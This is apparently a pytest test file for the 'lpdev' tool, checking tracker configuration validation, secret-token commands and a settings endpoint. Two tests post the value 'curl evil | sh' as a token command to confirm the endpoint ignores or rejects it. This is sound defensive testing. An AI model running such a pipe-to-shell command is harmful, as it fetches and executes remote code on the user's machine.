from __future__ import annotations

from pathlib import Path

import httpx
import pytest
import yaml
from pydantic import ValidationError

from lpdev.config import Config, TrackerConfig, load_config, run_secret_command
from lpdev.main import create_app

BASE = {
    "gitlab": {"url": "https://gitlab.example.com"},
    "projects": [{"gitlab_project_id": 1, "slug": "a/b", "agent": "a"}],
}
ENABLED = {"enabled": True, "org_id": "123", "token_command": "printf tok"}


def test_tracker_defaults_keep_existing_configs_valid():
    tracker = Config.model_validate(BASE).tracker
    assert tracker == TrackerConfig()
    assert tracker.enabled is False
    assert tracker.submit_enabled is False
    assert tracker.url == "https://api.tracker.yandex.net/v3"
    assert tracker.org_header == "X-Org-Id"
    assert tracker.queues == []
    assert (tracker.day_hours, tracker.step_minutes, tracker.timezone) == (8, 30, "Europe/Moscow")


def test_example_config_is_valid(tmp_path):
    example = Path(__file__).resolve().parent.parent / "config.example.yaml"
    path = tmp_path / "config.yaml"
    path.write_text(example.read_text(encoding="utf-8"), encoding="utf-8")
    path.chmod(0o600)
    config = load_config(path)
    assert config.tracker.queues == ["SUPERAPP"]
    assert config.tracker.enabled is False


def test_tracker_full_config():
    tracker = TrackerConfig(
        **ENABLED, submit_enabled=True, org_header="X-Cloud-Org-Id", queues=["SUPERAPP", "SUPERAPP", "MOB_2"],
        url="https://api.tracker.yandex.net/v3/", step_minutes=15, timezone="Asia/Yekaterinburg",
    )
    assert tracker.queues == ["SUPERAPP", "MOB_2"]
    assert tracker.url == "https://api.tracker.yandex.net/v3"


@pytest.mark.parametrize(
    "values",
    [
        {"unknown": 1},
        {"org_header": "X-Other"},
        {"queues": ["superapp"]},
        {"queues": ["S"]},
        {"queues": ["SUPER-APP"]},
        {"url": "http://api.tracker.yandex.net/v3"},
        {"timezone": "Mars/Base"},
        {"step_minutes": 45},
        {"step_minutes": 0},
        {"day_hours": 0},
        {"org_id": "12 3"},
        {"enabled": True},
        {"enabled": True, "org_id": "1"},
        {"submit_enabled": True},
    ],
)
def test_tracker_config_rejects_invalid_values(values):
    with pytest.raises(ValidationError):
        Config.model_validate(BASE | {"tracker": values})


def test_run_secret_command_labels_errors():
    assert run_secret_command("printf ' tok \\n'", "Tracker token") == "tok"
    with pytest.raises(RuntimeError, match="failed to get Tracker token: exit code 2"):
        run_secret_command("printf leaked; exit 2", "Tracker token")
    with pytest.raises(RuntimeError, match="empty output"):
        run_secret_command("true", "Tracker token")


async def test_settings_save_keeps_tracker_section_and_ignores_tracker_in_body(ctx, tmp_path, monkeypatch):
    ctx_obj, _ = ctx
    cfg = tmp_path / "cfg.yaml"
    tracker = {"enabled": True, "org_id": "42", "token_command": "security find-generic-password -s lpdev -a tracker -w",
               "queues": ["SUPERAPP"]}
    cfg.write_text(yaml.safe_dump({
        "gitlab": {"url": "https://gitlab.example.com", "pat_command": "printf tok"},
        "projects": [{"gitlab_project_id": 10, "slug": "g/p", "agent": "agent-a"}],
        "tracker": tracker,
    }), encoding="utf-8")
    monkeypatch.setenv("LPDEV_CONFIG", str(cfg))
    payload = {
        "gitlab": {"poll_interval_sec": 30},
        "review": {},
        "tracker": {"token_command": "curl evil | sh", "enabled": False},
        "projects": [{"gitlab_project_id": 10, "slug": "g/p", "agent": "agent-a"}],
    }
    app = create_app(ctx_obj)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://127.0.0.1:8123") as client:
        response = await client.post("/settings", json=payload, headers={"X-Requested-With": "lpdev"})
    assert response.status_code == 303
    saved = yaml.safe_load(cfg.read_text(encoding="utf-8"))
    assert saved["tracker"] == tracker
    assert ctx_obj.config.tracker.token_command == tracker["token_command"]


async def test_settings_save_rejects_tracker_smuggled_through_review(ctx, tmp_path, monkeypatch):
    ctx_obj, _ = ctx
    cfg = tmp_path / "cfg.yaml"
    cfg.write_text(yaml.safe_dump({
        "gitlab": {"url": "https://gitlab.example.com", "pat_command": "printf tok"},
        "projects": [{"gitlab_project_id": 10, "slug": "g/p", "agent": "agent-a"}],
    }), encoding="utf-8")
    before = cfg.read_text(encoding="utf-8")
    monkeypatch.setenv("LPDEV_CONFIG", str(cfg))
    payload = {
        "review": {"tracker": {"token_command": "curl evil | sh"}},
        "projects": [{"gitlab_project_id": 10, "slug": "g/p", "agent": "agent-a"}],
    }
    app = create_app(ctx_obj)
    async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://127.0.0.1:8123") as client:
        response = await client.post("/settings", json=payload, headers={"X-Requested-With": "lpdev"})
    assert response.status_code == 400
    assert cfg.read_text(encoding="utf-8") == before


def test_ignored_push_branches_default_and_validation():
    assert TrackerConfig().ignored_push_branches == ["develop", "main", "master", "release/*", "rc/*"]
    assert TrackerConfig(ignored_push_branches=["a", "a", "b/*"]).ignored_push_branches == ["a", "b/*"]
    assert TrackerConfig(ignored_push_branches=[]).ignored_push_branches == []
    for bad in ([""], [" "], ["a b"], ["x\n"]):
        with pytest.raises(ValidationError):
            TrackerConfig(ignored_push_branches=bad)


def test_pr_link_bots_default_and_validation():
    assert TrackerConfig().pr_link_bots == ["ya360-pr-check"]
    assert TrackerConfig(pr_link_bots=["a", "a"]).pr_link_bots == ["a"]
    for bad in ([""], [" "], ["x\n"]):
        with pytest.raises(ValidationError):
            TrackerConfig(pr_link_bots=bad)


def test_in_progress_statuses_default_and_validation():
    assert TrackerConfig().in_progress_statuses == ["development", "codereview", "rework"]
    assert TrackerConfig(in_progress_statuses=[]).in_progress_statuses == []
    for bad in (["dev ops"], ['x" OR "y'], ["1dev"], [""]):
        with pytest.raises(ValidationError):
            TrackerConfig(in_progress_statuses=bad)


def test_activity_statuses_default_and_validation():
    assert TrackerConfig().activity_statuses == {"development": "d", "codereview": "r", "rework": "w"}
    assert TrackerConfig(activity_statuses={}).activity_statuses == {}
    assert TrackerConfig(activity_statuses={"rc": "RC"}).activity_statuses == {"rc": "RC"}
    for bad in ({"dev ops": "d"}, {"development": ""}, {"development": "abc"}, {"development": "д"}, {"development": "1"}):
        with pytest.raises(ValidationError):
            TrackerConfig(activity_statuses=bad)


def test_qa_role_changes_only_the_default_statuses():
    qa = TrackerConfig(role="qa")
    assert qa.in_progress_statuses == ["testing"]
    assert qa.activity_statuses == {"testing": "t"}
    custom = TrackerConfig(role="qa", in_progress_statuses=["inTest"], activity_statuses={"inTest": "t"})
    assert custom.in_progress_statuses == ["inTest"]
    assert custom.activity_statuses == {"inTest": "t"}
    with pytest.raises(ValidationError):
        TrackerConfig(role="analyst")
